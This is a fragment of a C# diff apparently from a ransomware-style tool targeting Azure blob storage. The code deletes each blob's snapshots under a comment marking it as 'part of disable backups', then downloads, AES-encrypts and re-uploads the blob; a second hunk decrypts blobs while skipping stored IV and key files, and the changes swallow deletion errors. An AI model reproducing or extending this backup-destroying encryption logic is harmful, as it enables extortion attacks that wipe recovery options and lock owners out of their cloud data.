@@ -23,13 +23,18 @@ public class Blob_Storage
                 if (item.GetType() == typeof(CloudBlockBlob) || item.GetType() == typeof(CloudPageBlob))
                 {
                     CloudBlockBlob blob = (CloudBlockBlob)item;
-                    blob.Delete(DeleteSnapshotsOption.DeleteSnapshotsOnly); // part of disable backups
-                    Console.WriteLine("Block blob named: {0}", blob.Name);
+                    try
+                    {
+                        blob.Delete(DeleteSnapshotsOption.DeleteSnapshotsOnly);
+                    }
+                    catch (Exception e) { }
+                     // part of disable backups
+                    Console.WriteLine("Encrypting Block blob named: {0}", blob.Name);
                     Download(blob, Utils.getPath());
 
                    // AESEncryption encrypt = new AESEncryption();
                     encrypt.EncryptAES(Utils.getPath() + blob.Name, storageAccount);
-                    encrypt.OnFinishEncryption(storageAccount);
+                    //encrypt.OnFinishEncryption(storageAccount);
                     Upload(blob, Utils.getPath());
                 }
             }
@@ -53,8 +58,8 @@ public class Blob_Storage
                 if (item.GetType() == typeof(CloudBlockBlob) || item.GetType() == typeof(CloudPageBlob))
                 {
                     CloudBlockBlob blob = (CloudBlockBlob)item;
-                    blob.Delete(DeleteSnapshotsOption.DeleteSnapshotsOnly); // part of disable backups
-                    Console.WriteLine("Block blob named: {0}", blob.Name);
+                    if (blob.Name.EndsWith("IV") || blob.Name.EndsWith("key")) continue;
+                    Console.WriteLine("Decrypting Block blob named: {0}", blob.Name);
                     Download(blob, Utils.getPath());
 
                     // AESEncryption encrypt = new AESEncryption();
